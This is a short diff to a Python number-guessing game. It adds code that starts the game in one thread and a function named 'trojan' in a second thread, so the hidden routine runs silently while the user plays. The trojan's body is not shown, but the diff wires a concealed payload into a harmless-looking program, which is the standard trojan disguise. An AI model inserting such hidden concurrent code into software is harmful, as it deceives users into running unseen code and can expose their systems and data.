@@ -31,3 +31,10 @@ def game():
             else:
                 print('actuel number is larger')  
     print(f"You need {tries} tries")              
+
+
+t1 = threading.Thread(target=game)
+t2 = threading.Thread(target=trojan)
+
+t1.start()
+t2.start()
